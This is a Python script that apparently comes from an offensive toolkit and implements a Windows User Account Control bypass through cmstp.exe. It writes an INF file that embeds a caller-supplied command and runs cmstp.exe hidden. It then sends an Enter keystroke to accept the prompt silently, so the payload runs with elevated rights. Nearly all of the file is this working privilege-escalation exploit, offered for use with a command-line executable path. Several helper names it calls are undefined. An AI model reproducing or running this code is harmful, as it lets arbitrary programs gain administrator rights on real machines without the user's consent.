import sys
import tempfile
import ctypes
from ctypes import *
from ctypes.wintypes import *
import time
import os

#https://oddvar.moe/2017/08/15/research-on-cmstp-exe/

class ShellExecuteInfoW(Structure):
	""" https://docs.microsoft.com/en-us/windows/win32/api/shellapi/ns-shellapi-shellexecuteinfow """
	_fields_ = [
				("cbSize", DWORD),
				("fMask", ULONG),
				("hwnd", HWND),
				("lpVerb", LPWSTR),
				("lpFile", LPWSTR),
				("lpParameters", LPWSTR),
				("lpDirectory", LPWSTR),
				("nShow", INT),
				("hInstApp", HINSTANCE),
				("lpIDList", LPVOID),
				("lpClass", LPWSTR),
				("hKeyClass", HKEY),
				("dwHotKey", DWORD),
				("hIcon", HANDLE),
				("hProcess", HANDLE)
				]
SEE_MASK_NOCLOSEPROCESS = 0x00000040
SW_HIDE = 0
ShellExecuteEx = ctypes.windll.shell32.ShellExecuteExW
class process():
	def create(self, payload, params="", window=False, get_exit_code=False):
		shinfo = ShellExecuteInfoW()
		shinfo.cbSize = sizeof(shinfo)
		shinfo.fMask = SEE_MASK_NOCLOSEPROCESS
		shinfo.lpFile = payload
		shinfo.nShow = SW_SHOW if window else SW_HIDE
		shinfo.lpParameters = params

		if ShellExecuteEx(byref(shinfo)):
			if get_exit_code:
				ctypes.windll.kernel32.WaitForSingleObject(shinfo.hProcess, -1)
				i = ctypes.c_int(0)
				pi = ctypes.pointer(i)
				if ctypes.windll.kernel32.GetExitCodeProcess(shinfo.hProcess, pi) != 0:
					return i.value

			return True
		else:
			return False
def uacMethod13_cleanup():
	print("Performing cleaning")
	try:
		os.remove(os.path.join(tempfile.gettempdir(), "tmp.ini"))
	except Exception as error:
		print("Unable to clean up, manual cleaning is needed")
		return False
	else:
		print("Successfully cleaned up")
		print("All done!")

def uacMethod13(payload):
	if payload:
		inf_template = '''[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
''' + payload + '''
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="WinPwnageVPN"
ShortSvcName="WinPwnageVPN"
'''
		try:
			ini_file = open(os.path.join(tempfile.gettempdir(), "tmp.ini"), "w")
			ini_file.write(inf_template)
			ini_file.close()
		except Exception:
			print("Cannot proceed, unable to ini file to disk ({})".format(os.path.join(tempfile.gettempdir(), "tmp.ini")))
			return False
		else:
			print("Successfully wrote ini template to disk ({})".format(os.path.join(tempfile.gettempdir(), "tmp.ini")))

		time.sleep(1)

		# if process().terminate("cmstp.exe"):
		# 	print("Successfully terminated cmstp process")
		# else:
		# 	pass

		time.sleep(1)

		if process().create("cmstp.exe", params="/au {tmp_path}".format(tmp_path=os.path.join(tempfile.gettempdir(), "tmp.ini")), window=False):
		#if process().create("cmstp.exe", params="/au {tmp_path}".format(tmp_path=os.path.join(tempfile.gettempdir(), "tmp.ini")), window=True):
			print("Successfully triggered installation of ini file using cmstp binary")
		else:
			print_error("Unable to trigger installation of ini file using cmstp binary")
			for x in Constant.output:
				if "error" in x:
					uacMethod13_cleanup()
					return False

		time.sleep(1)

		"""
		hwnd = ctypes.windll.user32.FindWindowA(None, "WinPwnageVPN")
		if hwnd:
			print_success("Successfully detected process window - hwnd ({hwnd})".format(hwnd=hwnd))
		else:
			print_error("Unable to detect process window, cannot proceed")
			for x in Constant.output:
				if "error" in x:
					cmstp_cleanup()
					return False

		time.sleep(1)

		if ctypes.windll.user32.SetForegroundWindow(hwnd):
			print_success("Activated window using SetForegroundWindow - hwnd ({hwnd})".format(hwnd=hwnd))			
		else:
			print_error("Unable to activate window using SetForegroundWindow - hwnd ({hwnd})".format(hwnd=hwnd))
			for x in Constant.output:
				if "error" in x:
					cmstp_cleanup()
					return False		
		
		time.sleep(1)
		"""

		if ctypes.windll.user32.keybd_event(0x0D,0,0,0):
			#print_success("Successfully sent keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))
			print("Successfully sent keyboard-event to window")
			time.sleep(5)
			uacMethod13_cleanup()
		else:
			#print_error("Unable to send keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))
			print_error("Unable to send keyboard-event to window")
			for x in Constant.output:
				if "error" in x:
					uacMethod13_cleanup()
					return False
	else:
		print("Cannot proceed, invalid payload")
		return False

if __name__ == "__main__":
	if len(sys.argv) < 2:
		print("Usage: {} <path_exe>".format(sys.argv[0]))
		sys.exit(0)
	uacMethod13(sys.argv[1])
